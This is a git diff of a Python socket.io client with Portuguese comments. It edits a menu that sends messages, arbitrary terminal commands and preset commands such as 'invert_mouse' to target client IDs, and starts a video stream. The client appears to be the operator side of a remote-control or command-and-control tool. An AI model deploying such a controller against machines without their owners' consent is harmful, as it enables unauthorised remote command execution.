@@ -133,9 +133,8 @@ def on_message(data):
 @socketClient.on('video_frame')
 def on_video_frame(data):
     try:
-        if is_streaming:
-            time.sleep(0.03)
-            print("Frame recebido do servidor.")
+        
+        print("Frame recebido do servidor.")
 
         # Decodifica o frame recebido
         frame_base64 = data['frame']
@@ -149,7 +148,7 @@ def on_video_frame(data):
         # Exibe o frame
         cv2.imshow('Transmissão ao Vivo', frame)
 
-        # Verifica a tecla 'q' para fechar a janela
+
         if cv2.waitKey(1) & 0xFF == ord('q'):
             print("Encerrando visualização do vídeo.")
             cv2.destroyAllWindows()
@@ -205,7 +204,7 @@ def main():
 
     socketClient.connect('http://localhost:3000')
 
-    # await 
+    
     while True:
         print("\nOpções:")
         print("1. Enviar mensagem")
@@ -219,7 +218,7 @@ def main():
 
 
         choice = input("Escolha: ")
-
+        # enviar Mensagem
         if choice == '1':
             print("\nMensagem para :")
             print ('1. ID específico')
@@ -235,11 +234,14 @@ def main():
                     socketClient.emit('send_message', {'target': target, 'message': message})
             else:
                     print("Opção Inválida!")
-
+                    
+         # enviar Comando para o terminal
         elif choice == '2':
             target = input("Enviar comando para (ID): ")
             command = input("Comando: ")
             socketClient.emit('send_command', {'target': target, 'command': command})
+            
+        # enviar Comandos pré programados para o terminal
         elif choice == '3':
             print("\nComandos pré-definidos:")
             print("1. Inverter movimento do mouse (invert_mouse)")
@@ -259,13 +261,15 @@ def main():
                 continue
 
             socketClient.emit('send_command', {'target': target, 'command': command})
+
+        # enviar frames de video/ parar de ennviar
         elif choice == '4':
             if is_streaming:
-                # Parar a transmissão
+                # parar a transmissão
                 print("Encerrando transmissão de vídeo...")
                 is_streaming = False
             else:
-                # Iniciar a transmissão
+                # iniciar a transmissão
                 target = input("Enviar transmissão de vídeo para (ID): ")
                 threading.Thread(target=start_video_stream, args=(target,), daemon=True).start()
 
